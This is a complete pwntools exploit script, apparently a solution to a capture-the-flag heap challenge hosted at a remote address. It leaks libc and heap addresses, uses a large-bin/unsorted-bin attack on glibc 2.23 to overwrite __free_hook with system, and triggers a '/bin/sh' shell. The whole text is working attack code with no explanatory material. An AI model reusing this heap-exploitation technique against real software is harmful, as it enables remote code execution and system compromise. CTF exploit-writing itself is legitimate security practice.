from pwn import *

###Util
def create(size):
    r.sendlineafter('choice?\n','1')
    r.sendlineafter('want?\n',str(size))

def delete(idx):
    r.sendlineafter('choice?\n','2')
    r.sendlineafter('delete?\n',str(idx))

def edit(idx,data):
    r.sendlineafter('choice?\n','3')
    r.sendlineafter('modify?\n',str(idx))
    r.sendafter('input?\n',data)

def show(idx):
    r.sendlineafter('choice?\n','4')
    r.sendlineafter('see?\n',str(idx))
    return r.recvline()[:-1]

###Addr
#  libc2.23
main_arena_offset = 0x3c4b20
unsorted_bin_offset = main_arena_offset+0x58
large_bin_offset = main_arena_offset+0x448
free_hook_offset = 0x3c67a8
system_offset = 0x45390

###Exploit
r = remote('nc.eonew.cn',10001)

create(0x48)    #0
create(0x18)    #1
create(0x418)   #2
create(0x18)    #3
create(0x428)   #4
create(0x18)    #5
delete(2)
delete(4)
unsorted_bin_addr = u64(show(2)+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

heap_addr = u64(show(4).ljust(8,b'\x00'))-0x70
print(hex(heap_addr))

create(0x428)   #6
edit(2,p64(0)+p64(libc_base+free_hook_offset-0x8-0x10)+p64(0)+p64(libc_base+free_hook_offset-0x1d-0x20))
delete(6)
create(0x438)   #7

delete(0)
edit(0,p64(libc_base+unsorted_bin_offset)+p64(libc_base+free_hook_offset-0x20))
create(0x48)    #8

create(0x48)    #9
edit(9,b'/bin/sh\x00'+p64(0)+p64(libc_base+system_offset))
delete(9)

r.interactive()
